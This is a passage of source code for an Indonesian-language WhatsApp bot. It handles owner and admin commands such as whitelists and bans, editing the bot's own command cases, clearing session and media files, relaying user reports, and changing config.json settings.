				if (!isCreator) return m.tolak(mess.OnlyOwner)
				await vreden.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
			}
			break
			case 'public': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				vreden.public = true
				m.reply('Sukses Change To Public Mode')
			}
			break
			case 'wl':
			case 'whitelist': {
				if (!isCreator && !isAdmins) return m.tolak(mess.GrupAdmin)
				try {
					let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
					if (ownerNumber.includes(users)) return m.warning('Tidak Dapat Melakukannya Kepada Owner')
					if (!m.mentionedJid[0] && !m.quoted && !text) return m.warning(`Tag/Reply Target Yang Mau Di ${command}`)
					const isWhitelistt = whitelist.includes(users) ? true : false
					if (isWhitelistt) return vreden.sendTextWithMentions(m.chat, `@${users.split('@')[0]} Telah Di Whitelist Sebelumnya`, m)
					whitelist.push(users)
					fs.writeFileSync('./database/whitelist.json', JSON.stringify(whitelist, null, 2))
					vreden.sendTextWithMentions(m.chat, `Succes whitelist @${users.split('@')[0]}`, m)
				} catch (err) {
					m.reply(`Tag/Reply Target Yang Mau Di Whitelist`)
				}
			}
			break
			case 'unwhite':
			case 'unwhitelist': {
				if (!isCreator && !isAdmins) return m.tolak(mess.GrupAdmin)
				try {
					let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
					if (ownerNumber.includes(users)) return m.warning('Tidak Dapat Melakukannya Kepada Owner')
					if (!m.mentionedJid[0] && !m.quoted && !text) return m.warning(`Tag/Reply Target Yang Mau Di ${command}`)
					const isWhitelistt = whitelist.includes(users) ? true : false
					if (!isWhitelistt) return vreden.sendTextWithMentions(m.chat, `@${users.split('@')[0]} Tidak Ada Didaftar Whitelist`, m)
					let anu = whitelist.indexOf(users)
					whitelist.splice(anu, 1)
					fs.writeFileSync('./database/whitelist.json', JSON.stringify(whitelist, null, 2))
					vreden.sendTextWithMentions(m.chat, `Succes Unwhitelist @${users.split('@')[0]}`, m)
				} catch (err) {
					m.reply(`Tag/Reply Target Yang Mau Di Un-whitelist`)
				}
			}
			break
			case 'listwl':
			case 'listwhitelist': {
				let txt = `------------ » *WHITELIST* « ------------\nTotal: *${whitelist.length}* Ditandai\n\n`
				for (let blck of whitelist) {
					txt += `*»* @${blck.split('@')[0]}\n`
				}
				vreden.sendTextWithMentions(m.chat, txt, m)
			}
			break
			case 'bl':
			case 'blacklist':
			case 'tandai': {
				if (!isCreator && !isAdmins) return m.tolak(mess.GrupAdmin)
				try {
					let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
					if (ownerNumber.includes(users)) return m.warning('Tidak Dapat Melakukannya Kepada Owner')
					if (!m.mentionedJid[0] && !m.quoted && !text) return m.warning(`Tag/Reply Target Yang Mau Di ${command}`)
					const isBlacklistt = blacklist.includes(users) ? true : false
					if (isBlacklistt) return vreden.sendTextWithMentions(m.chat, `@${users.split('@')[0]} Telah Di Blacklist Sebelumnya`, m)
					blacklist.push(users)
					fs.writeFileSync('./database/blacklist.json', JSON.stringify(blacklist, null, 2))
					vreden.sendTextWithMentions(m.chat, `Succes blacklist @${users.split('@')[0]}`, m)
				} catch (err) {
					m.reply(`Tag/Reply Target Yang Mau Di blacklist`)
				}
			}
			break
			case 'unblack':
			case 'unblacklist': {
				if (!isCreator && !isAdmins) return m.tolak(mess.GrupAdmin)
				try {
					let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
					if (ownerNumber.includes(users)) return m.warning('Tidak Dapat Melakukannya Kepada Owner')
					if (!m.mentionedJid[0] && !m.quoted && !text) return m.warning(`Tag/Reply Target Yang Mau Di ${command}`)
					const isBlacklistt = blacklist.includes(users) ? true : false
					if (!isBlacklistt) return vreden.sendTextWithMentions(m.chat, `@${users.split('@')[0]} Tidak Ada Didaftar Blacklist`, m)
					let anu = blacklist.indexOf(users)
					blacklist.splice(anu, 1)
					fs.writeFileSync('./database/blacklist.json', JSON.stringify(blacklist, null, 2))
					vreden.sendTextWithMentions(m.chat, `Succes Unblacklist @${users.split('@')[0]}`, m)
				} catch (err) {
					m.reply(`Tag/Reply Target Yang Mau Di Un-blacklist`)
				}
			}
			break
			case 'listbl':
			case 'listblacklist': {
				let txt = `------------ » *BLACKLIST* « ------------\nTotal: *${blacklist.length}* Ditandai\n\n`
				for (let blck of blacklist) {
					txt += `*»* @${blck.split('@')[0]}\n`
				}
				vreden.sendTextWithMentions(m.chat, txt, m)
			}
			break
			case 'listban':
			case 'listbanned': {
				let txt = `------------ » *BANNED* « ------------\nTotal: *${banned.length}* Di-banned\n\n`
				for (let blk of banned) {
					txt += `*»:* @${blk.split('@')[0]}\n`
				}
				vreden.sendTextWithMentions(m.chat, txt, m)
			}
			break
			case 'ban':
			case 'banned': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				try {
					let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
					if (ownerNumber.includes(users)) return m.warning('Tidak Dapat Melakukannya Kepada Owner')
					if (!m.mentionedJid[0] && !m.quoted && !text) return m.warning(`Tag/Reply Target Yang Mau Di ${command}`)
					const iscBan = banned.includes(users)
					if (iscBan) return vreden.sendTextWithMentions(m.chat, `@${users.split('@')[0]} Telah Di Banned Sebelumnya`, m)
					banned.push(users)
					fs.writeFileSync('./database/banned.json', JSON.stringify(banned, null, 2))
					vreden.sendTextWithMentions(m.chat, `Succes banned @${users.split('@')[0]}`, m)
				} catch (err) {
					m.reply(`Tag/Reply Target Yang Mau Di Banned`)
				}
			}
			break
			case 'gfl':
			case 'gantifile': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (!text.includes("./")) return m.warning(`*• Contoh* : ${prefix + command} ./package.json`)
				let files = fs.readdirSync(text.split(m.quoted.fileName)[0])
				if (!files.includes(m.quoted.fileName)) return reply("File not found")
				let media = await downloadContentFromMessage(m.quoted, "document")
				let buffer = Buffer.from([])
				for await (const chunk of media) {
					buffer = Buffer.concat([buffer, chunk])
				}
				fs.writeFileSync(text, buffer)
				m.reply(`Mengupload...`)
				await sleep(2000)
				m.reply(`Berhasil mengganti file ${q}`)
			}
			break
			case 'addfun':
			case 'addfunction': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (!text) return m.warning('Mana function nya bang?');
				const fs = require('fs');
				const namaFile = 'vreden.js';
				const caseBaru = `${text}`;
				fs.readFile(namaFile, 'utf8', (err, data) => {
					if (err) {
						console.error('Terjadi kesalahan saat membaca file:', err);
						return;
					}
					const posisiAwalGimage = data.indexOf("function randomNomor(min, max = null) {");
					if (posisiAwalGimage !== -1) {
						const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
						fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
							if (err) {
								m.reply('Terjadi kesalahan saat menulis file:', err);
							} else {
								m.reply('Berhasil menambahkan function baru!.');
							}
						});
					} else {
						m.reply('Tidak dapat menambahkan function dalam file.');
					}
				});
			}
			break
			case "getsw": {
				if (m.quoted.chat != "status@broadcast") return reply(`Reply Status WhatsApp !`);
				let buffer = await m.quoted.download();
				await vreden.sendFile(
					m.chat,
					buffer,
					"",
					m.quoted.text || "",
					null,
					false, {
						quoted: m
					},
				).catch((_) => m.reply(m.quoted.text || ""));
			}
			break;
			case "listsw": {
				if (!isCreator) return m.reply("Pribasi woiii")
				if (!store.messages["status@broadcast"].array.length === 0) return m.reply("Gaada 1 status pun");
				let stories = store.messages["status@broadcast"].array;
				let story = stories.filter(
					(v) => v.message && v.message.protocolMessage?.type !== 0,
				);
				if (story.length === 0) return m.reply("Status gaada");
				const result = {};
				story.forEach((obj) => {
					let participant = obj.key.participant || obj.participant;
					participant = jidNormalizedUser(
						participant === "status_me" ? vreden.user.id : participant,
					);
					if (!result[participant]) {
						result[participant] = [];
					}
					result[participant].push(obj);
				});
				let type = (mType) =>
					getContentType(mType) === "extendedTextMessage" ?
					"text" :
					getContentType(mType).replace("Message", "");
				let text = "";
				for (let id of Object.keys(result)) {
					if (!id) return;
					text += `*- ${await vreden.getName(id)}*\n`;
					text += `${result[id].map((v, i) => `${i + 1}. ${type(v.message)}`).join("\n")}\n\n`;
				}
				await m.sendMentions(text.trim());
			}
			break;
			case 'listcase': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				const code = fs.readFileSync("./vreden.js", "utf8")
				var regex = /case\s+'([^']+)':/g;
				var matches = [];
				var match;
				while ((match = regex.exec(code))) {
					matches.push(match[1]);
				}
				let teks = `*Total Case*: ${matches.length} \n\n`
				matches.forEach(function(x) {
					teks += "  ◦  " + x + "\n"
				})
				m.reply(teks)
			}
			break
			case 'delcase': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (!text) return m.warning('Mana case nya bang?');
				dellCase('./vreden.js', q)
				m.reply('Berhasil menghapus case!.');
			}
			break
			case 'addcase': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (!text) return m.warning('Mana case nya bang?');
				const fs = require('fs');
				const namaFile = 'vreden.js';
				const caseBaru = `${text}`;
				fs.readFile(namaFile, 'utf8', (err, data) => {
					if (err) {
						console.error('Terjadi kesalahan saat membaca file:', err);
						return;
					}
					const posisiAwalGimage = data.indexOf("case 'addcase':");
					if (posisiAwalGimage !== -1) {
						const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
						fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
							if (err) {
								m.reply('Terjadi kesalahan saat menulis file:', err);
							} else {
								m.reply('Berhasil menambahkan case baru!.');
							}
						});
					} else {
						m.reply('Tidak dapat menambahkan case dalam file.');
					}
				});
			}
			break
			case 'getcase':
				if (!isCreator) return m.tolak('Khusus Owner!')
				if (!text) return m.warning(`Mau ambil case apa? `)
				const getCase = (cases) => {
					return "case" + `'${cases}'` + fs.readFileSync("./vreden.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
				}
				m.reply(`${getCase(q)}`)
				break
			case 'unban':
			case 'unbanned': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				try {
					let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
					if (!m.mentionedJid[0] && !m.quoted && !text) return m.warning(`Tag/Reply Target Yang Mau Di ${command}`)
					const iscBan = banned.includes(users)
					if (!iscBan) return vreden.sendTextWithMentions(m.chat, `@${users.split('@')[0]} Tidak Ada Didaftar Banned`, m)
					let anu = banned.indexOf(users)
					banned.splice(anu, 1)
					fs.writeFileSync('./database/banned.json', JSON.stringify(banned, null, 2))
					vreden.sendTextWithMentions(m.chat, `Succes Unbanned @${users.split('@')[0]}`, m)
				} catch (err) {
					m.reply(`Tag/Reply Target Yang Mau Di Un-Banned`)
				}
			}
			break
			case 'self': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				vreden.public = false
				m.reply('Sukses Change To Self Mode')
			}
			break
			case 'block':
			case 'blok':
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (!text) return m.warning(`Masukkan nomor target!`)
				let blok = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				vreden.updateBlockStatus(blok, 'block')
				m.reply(`Sukses block @${blok.split('@')[0]}`)
				break
			case 'unblock':
			case 'unblok':
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (!text) return m.warning(`Masukkan nomor target!`)
				let unblok = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				vreden.updateBlockStatus(unblok, 'unblock')
				m.reply(`Sukses unblock @${unblok.split('@')[0]}`)
				break
			case 'listblock':
			case 'listblok':
				let listblok = await vreden.fetchBlocklist()
				m.reply('*LIST BLOCK*\n' + `Total: ${listblok == undefined ? '*0* Diblokir' : '*' + listblok.length + '* Diblokir'}\n\n` + listblok.map(v => '» @' + v.replace(/@.+/, '')).join`\n`)
				break
			case 'sampah':
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let all = await fs.readdirSync('./sticker')
				var teks = `JUMLAH SAMPAH SYSTEM\n\n`
				teks += `Total : ${all.filter(v => v.endsWith("gif") || v.endsWith("png") || v.endsWith("mp3") || v.endsWith("mp4") || v.endsWith("jpg") || v.endsWith("jpeg") || v.endsWith("webp") || v.endsWith("webm") ).map(v=>v).length} Sampah\n\n`
				teks += all.filter(v => v.endsWith("gif") || v.endsWith("png") || v.endsWith("mp3") || v.endsWith("mp4") || v.endsWith("jpg") || v.endsWith("jpeg") || v.endsWith("webp") || v.endsWith("webm")).map(o => `${o}\n`).join("");
				m.reply(teks)
				break
			case 'sendpc': {
				if (!q) return m.warning(`Contoh: ${prefix+command} 628572562726|halo`)
				var no = text.split('|')[0]
				var cet = text.split('|')[1]
				if (isNaN(no)) return m.warning(`Nomor harus berupa angka!`)
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : no.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				try {
					await vreden.sendText(`${users}`, `${cet}`, fhalo)
				} catch (e) {
					m.reply('Terjadi Kesalahan')
				}
			}
			break
			case 'report': {
				this.report = this.report ? this.report : {}
				roof = Object.values(this.report).find(reporrr => [reporrr.a, reporrr.b].includes(m.sender))
				if (roof) return m.warning("Kamu Sedang Berkomunikasi Dengan Owner")
				if (m.isGroup) return m.warning('Fitur Khusus Di private chat!')
				if (!text) return m.warning(`Kirim Perintah ${prefix + command} pesan\n\nContoh :\n${prefix + command} bang ytmp3 error\n`)
				var yoi = `\n\nDari: ${usernomor}\nPukul: ${time}\n\n*Contents of the report*\n${text}`
				let id = m.sender
				this.report[id] = {
					id,
					a: m.sender,
					b: nomorOwner,
					state: 'WAITING'
				}
				let button = [{
					"name": "quick_reply",
					"buttonParamsJson": `{\"display_text\":\"Tolak Report\",\"id\":\".tolakreport\"}`
				}, {
					"name": "quick_reply",
					"buttonParamsJson": `{\"display_text\":\"Balas Report\",\"id\":\".balasreport\"}`
				}]
				vreden.sendButtonText(nomorOwner, button, `*USER REPORTED*\n` + yoi, footer, m)
				vreden.sendTextWithMentions(m.chat, `📦 *REPORT - BOT*\n\n- *Name* : @${m.sender.split("@")[0]}\n- *Waktu* : ${time}\n\n*REPORT* :\n${text}\n\n_Pesan Telah Dikirimkan_\n> ${footxt}`, m)
			}
			break
			case 'balasreport': {
				roof = Object.values(this.report).find(reporrr => [reporrr.a, reporrr.b].includes(m.sender))
				if (!roof) return m.warning("Belum ada laporan")
				find = Object.values(this.report).find(reporrr => reporrr.state == 'WAITING')
				let room = Object.values(this.report).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING')
				let other = [room.a, room.b].find(user => user !== m.sender)
				find.b = m.sender
				find.state = 'CHATTING'
				this.report[find.id] = {
					...find
				}
				await vreden.sendMessage(other, {
					text: `Report Kamu Telah Dikonfirmasi Team, Sekarang Kamu Bisa Chat Dengan Team Melalui Bot\n\n*NOTE :*\nJika ingin berhenti dari CS center, silahkan ketik .stopreport`,
					mentions: [m.sender]
				})
				vreden.sendMessage(m.chat, {
					text: `_Berhasil Menerima Report!_\n\n*NOTE :*\nJika ingin berhenti dari CS center, silahkan ketik .stopreport`
				})
			}
			break
			case 'tolakreport': {
				roof = Object.values(this.report).find(reporrr => [reporrr.a, reporrr.b].includes(m.sender))
				if (!roof) return m.warning("Belum ada laporan")
				let room = Object.values(this.report).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING')
				let other = [room.a, room.b].find(user => user !== m.sender)
				find = Object.values(this.report).find(reporrr => reporrr.state == 'WAITING')
				vreden.sendMessage(other, {
					text: `_Uppsss... Team Kami Menolak Laporan Kamu_`,
					mentions: [m.sender]
				})
				// await vreden.sendMessage(find.a, {text: `_Uppsss... @${find.b.split("@")[0]} Menolak menfess kamu_`,mentions: [find.b]})
				m.reply("Report Ditolak ✅")
				delete this.report[roof.id]
			}
			break
			case 'stopreport': {
				//find = Object.values(this.report).find(reporrr => reporrr.state == 'WAITING')
				find = Object.values(this.report).find(reporrr => [reporrr.a, reporrr.b].includes(m.sender))
				if (!find) return m.warning("Belum ada laporan")
				const to = find.a == m.sender ? find.b : find.a
				vreden.sendMessage(to, {
					text: `_Team Kami Mengakhiri Chat!_\n\n> Terimakasih~`,
					mentions: [m.sender]
				})
				await m.reply("Chat Klien Di Putus!")
				delete this.report[find.id]
			}
			break
			case 'request': {
				if (!q) return m.warning(`Contoh: ${prefix+command} min tambahin fitur tiktok download`)
				if (text.length > 200) return m.warning('Maksimal 200 Karakter!')
				try {
					vreden.sendTextWithMentions(m.chat, `📦 *REQUEST - BOT*\n\n- *Name* : @${m.sender.split("@")[0]}\n- *Waktu* : ${time}\n\n*REQUEST* :\n${text}\n\n_Pesan Telah Dikirimkan_\n> ${footxt}`, m)
					await vreden.sendText(nomorOwner, `📦 *REQUEST FITUR*\n\n- *Dari* : ${m.sender.split("@")[0]}\n\n${text}\n\n> ${footxt}`, fbot)
				} catch (e) {
					m.reply('Terjadi Kesalahan')
				}
			}
			break
			case 'sendgc': {
				if (!q) return m.warning(`Contoh: ${prefix+command} 122646754757754|halo`)
				var no = text.split('|')[0]
				var cet = text.split('|')[1]
				if (isNaN(no)) return m.warning(`ID grup harus berupa angka!`)
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : no.replace(/[^0-9]/g, '') + '@g.us'
				try {
					await vreden.sendText(`${users}`, `${cet}`, fhalo)
				} catch (e) {
					m.reply('Terjadi Kesalahan')
				}
			}
			break
			case 'delsampah': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let directoryPath = path.join('./sticker') //&& './media') //path.join();
				fs.readdir(directoryPath, async function(err, files) {
					if (err) {
						return m.warning('Tidak dapat memindai direktori: ' + err);
					}
					let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3") || item.endsWith("mp4") || item.endsWith("jpg") || item.endsWith("jpeg") || item.endsWith("webp") || item.endsWith("webm"))
					var teks = `Terdeteksi ${filteredArray.length} file sampah\n\n`
					if (filteredArray.length == 0) return m.reply(teks)
					filteredArray.map(function(e, i) {
						teks += (i + 1) + `. ${e}\n`
					})
					editp(teks, "Menghapus file sampah...", "Berhasil menghapus semua sampah")
					await filteredArray.forEach(function(file) {
						fs.unlinkSync(`./sticker/${file}`) //&& `./media/${file}`) 
					});
				});
			}
			break
			case 'clearsesi': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let directoryPath = path.join('./sessionn') //&& './media') //path.join();
				fs.readdir(directoryPath, async function(err, files) {
					if (err) {
						return m.warning('Tidak dapat memindai direktori: ' + err);
					}
					let filteredArray = await files.filter(item => item.startsWith("session") || item.startsWith("pre-key") || item.startsWith("sender-key"))
					var teks = `Terdeteksi ${filteredArray.length} file sesi\n\n`
					if (filteredArray.length == 0) return m.reply(teks)
					/*filteredArray.map(function(e, i){
					teks += (i+1)+`. ${e}\n`
					})*/
					editp(teks, "Menghapus file sampah...", "Berhasil menghapus semua sampah")
					await filteredArray.forEach(function(file) {
						fs.unlinkSync(`./sessionn/${file}`) //&& `./media/${file}`) 
					});
				});
			}
			break
			case 'sampah2':
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let alll = await fs.readdirSync('./')
				var teks = `JUMLAH SAMPAH SYSTEM\n\n`
				teks += `Total : ${all.filter(v => v.endsWith("gif") || v.endsWith("png") || v.endsWith("mp3") || v.endsWith("mp4") || v.endsWith("jpg") || v.endsWith("jpeg") || v.endsWith("webp") || v.endsWith("webm") ).map(v=>v).length} Sampah\n\n`
				teks += fl.filter(v => v.endsWith("mp3")).map(o => `${o}\n`).join("");
				m.reply(teks)
				break
			case 'delsampah2': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let directoryPath = path.join('./') //&& './media') //path.join();
				fs.readdir(directoryPath, async function(err, files) {
					if (err) {
						return m.warning('Tidak dapat memindai direktori: ' + err);
					}
					let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3") || item.endsWith("mp4") || item.endsWith("jpg") || item.endsWith("jpeg") || item.endsWith("webp") || item.endsWith("webm"))
					var teks = `Terdeteksi ${filteredArray.length} file sampah\n\n`
					if (filteredArray.length == 0) return m.reply(teks)
					filteredArray.map(function(e, i) {
						teks += (i + 1) + `. ${e}\n`
					})
					editp(teks, "Menghapus file sampah...", "Berhasil menghapus semua sampah")
					await filteredArray.forEach(function(file) {
						fs.unlinkSync(`./${file}`) //&& `./media/${file}`) 
					});
				});
			}
			break
			case 'set': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let [teks1, ...message] = text.split(' ');
				message = message.join(' ');
				if (teks1 === 'tiktok') {
					if (!message) return m.warning(`*Masukan link TikTok!*\n\ncontoh: ${prefix+command} ${teks1} https://www.tiktok.com/@usr`)
					setting.tiktok = message
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply(`TikTok owner diubah ke ${message}`)
				} else if (teks1 === 'instagram') {
					if (!message) return m.warning(`*Masukan link Instagram!*\n\ncontoh: ${prefix+command} ${teks1} https://www.instagram.com/@usr`)
					setting.instagram = message
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply(`InstaGram owner diubah ke ${message}`)
				} else if (teks1 === 'gcwa') {
					if (!message) return m.warning(`*Masukan link Grup/Channel!*\n\ncontoh: ${prefix+command} ${teks1} https://chat.whatsapp.com/invite`)
					setting.gcwa = message
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply(`Grup/Channel owner diubah ke ${message}`)
				} else if (teks1 === 'botname') {
					if (!message) return m.warning(`*Masukan Nama Bot!*\n\ncontoh: ${prefix+command} ${teks1} Qioo Official`)
					setting.botName = message
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply(`Nama Bot diubah ke ${message}`)
				} else if (teks1 === 'footer') {
					if (!message) return m.warning(`*Masukan Footer Name!*\n\ncontoh: ${prefix+command} ${teks1} © 2024 • Qioo Official`)
					setting.footer = message
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply(`Footer Text diubah ke ${message}`)
				} else if (teks1 === 'zeeone') {
					if (!message) return m.warning(`*Masukan Apikey Zeeone!*\n\ncontoh: ${prefix+command} ${teks1} alpha736`)
					setting.BotKey = message
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply(`ZeeoneKey diubah ke ${message}`)
				} else if (teks1 === 'skizo') {
					if (!message) return m.warning(`*Masukan Apikey Skizo!*\n\ncontoh: ${prefix+command} ${teks1} vrdbotkey`)
					setting.XznKey = message
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply(`SkizoKey diubah ke ${message}`)
				} else if (teks1 === 'namasaluran') {
					if (!message) return m.warning(`*Masukan Nama Saluran!*\n\ncontoh: ${prefix+command} ${teks1} Qioo Uptime`)
					setting.namasaluran = message
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply(`Nama Saluran diubah ke ${message}`)
				} else if (teks1 === 'idsaluran') {
					if (!message) return m.warning(`*Masukan ID Saluran!*\n\ncontoh: ${prefix+command} ${teks1} 120363282083849178@newsletter`)
					setting.idsaluran = message
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply(`ID Saluran diubah ke ${message}`)
				} else if (teks1 === 'panel') {
					if (!message) return m.warning(`*Masukan Domain Panel!*\n\ncontoh: ${prefix+command} ${teks1} control.vreden.my.id`)
					setting.panel = message
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply(`Panel Link diubah ke ${message}`)
				} else if (teks1 === 'plta') {
					if (!message) return m.warning(`*Masukan PLTA Key!*\n\ncontoh: ${prefix+command} ${teks1} plta_ghjhfthhhfghugbtolol`)
					setting.cred = message
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply(`PLTA Key diubah ke ${message}`)
				} else if (teks1 === 'pltc') {
					if (!message) return m.warning(`*Masukan PLTC Key!*\n\ncontoh: ${prefix+command} ${teks1} pltc_asuugtgutfgugyuvyghugkntl`)
					setting.apiuser = message
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply(`PLTC Key diubah ke ${message}`)
				} else if (teks1 === 'nets') {
					if (!message) return m.warning(`*Masukan Nets ID!*\n\ncontoh: ${prefix+command} ${teks1} 5`)
					setting.netsnya = message
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply(`Nets ID diubah ke ${message}`)
				} else if (teks1 === 'eggs') {
					if (!message) return m.warning(`*Masukan Eggs ID!*\n\ncontoh: ${prefix+command} ${teks1} 15`)
					setting.eggsnya = message
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply(`Eggs ID diubah ke ${message}`)
				} else if (teks1 === 'location') {
					if (!message) return m.warning(`*Masukan Location ID!*\n\ncontoh: ${prefix+command} ${teks1} 1`)
					setting.location = message
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply(`Location ID diubah ke ${message}`)
				} else if (teks1 === 'menu') {
					if (!message) return m.warning(`*Masukan Menu ID!*\nStyle: v1 - v6\n\ncontoh: ${prefix+command} ${teks1} v1`)
					setting.menu = message
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply(`Menu ID diubah ke ${message}`)
				} else if (teks1 === 'thumb') {
					if (/image/.test(mime)) {
						let media = await vreden.downloadAndSaveMediaMessage(quoted);
						let anu = await pomfCDN(media);
						setting.pathimg = anu
						fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
						m.reply("Thumbnail Di Ubah!")
					} else {
						if (!message) return m.warning(`*Masukan Url/Kirim Image!*\n\ncontoh: ${prefix+command} ${teks1} https://telegra.ph/file/thumb.jpg`)
						setting.pathimg = message
						fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
						m.reply("Thumbnail Di Ubah!")
					}
				} else if (teks1 === 'home') {
					if (!message) return m.warning(`*Masukan Style Home!*\n\n*Contoh:*\n${prefix+command} ${teks1} ------------ » *BOT INFO* « ------------

*☏  Bot Name :* @botname
*♙  Prefix :* [ @prefix ]
*₪  Jam :* @jam
*▨  Total Fitur:* @totalfitur Fitur
*⚿  Total Error:* 4 Fitur
*♗  Your Device :* @device\n\n\n*Function:*\n- @botname (nama bot)\n- @prefix (prefix bot)\n- @jam (waktu WIB)\n- @totalfitur (Total Case)\n- @device (Get User Device)\n- @ucapan (Ucapan Salam)\n- @nomor (User Nombor)\n- @pushname (nama user)`)
					setting.home = message
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply(`Style Home diubah ke ${message}`)
				} else {
					m.sendForward(`*Masukan Type Setting!*

- footer
- botname
- gcwa
- instagram
- tiktok
- panel
- idsaluran
- namasaluran
- skizo
- zeeone
- plta
- pltc
- nets
- eggs
- location
- thumb
- menu
- home

*Contoh:*
.set tiktok

`)
				}
			}
			break
			case 'settings': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (m.isGroup) return m.warning("Demi Keamanan, Harap Gunakan Command Ini Di Private Chat")
				let txt = `------------ » *CONFIG.JSON* « ------------

Owner Name:
${setting.ownerName}
_ownerName_

Bot Name:
${setting.botName}
_botName_

Grup Bot:
${setting.gcwa}
_gcwa_

Name Channel:
${setting.namasaluran}
_namasaluran_

ID channel:
${setting.idsaluran}
_idsaluran_

Watermark:
${setting.footer}
_footer_

Zeeone Key:
${setting.BotKey}
_BotKey_

Skizo Key:
${setting.XznKey}
_XznKey_

TikTok:
${setting.tiktok}
_tiktok_

Instagram:
${setting.instagram}
_instagram_

Panel:
${setting.panel}
_panel_

PLTA key:
${setting.cred}
_cred_

PLTC key:
${setting.apiuser}
_apiuser_

ID Eggs:
${setting.eggsnya}
_eggsnya_

ID Nets:
${setting.netsnya}
_netsnya_

ID Locations:
${setting.location}
_location_

_*Untuk mengubah setelan config.json diatas ketik ${prefix}set*_

> ${footxt}`
				m.sendForward(txt)
			}
			break
			case 'setppbot': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (!quoted) return m.warning(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
				if (!/image/.test(mime)) return m.warning(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
				if (/webp/.test(mime)) return m.warning(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
				let media = await vreden.downloadAndSaveMediaMessage(quoted)
				await vreden.updateProfilePicture(botNumber, {
					url: media
				}).catch((err) => fs.unlinkSync(media))
				m.reply("Done")
			}
			break
			case 'nsfw': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (args[0] === 'on') {
					if (chatsdb[m.chat].nsfw) return m.reply("Udh on di group ini")
					chatsdb[m.chat].nsfw = true
					m.reply("Nsfw berhasil di aktifkan di group ini")
				} else if (args[0] === 'off') {
					if (!chatsdb[m.chat].nsfw) return m.reply("Udh off di group ini")
					chatsdb[m.chat].nsfw = false
					m.reply("Nsfw berhasil di nonaktifkan di group ini")
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
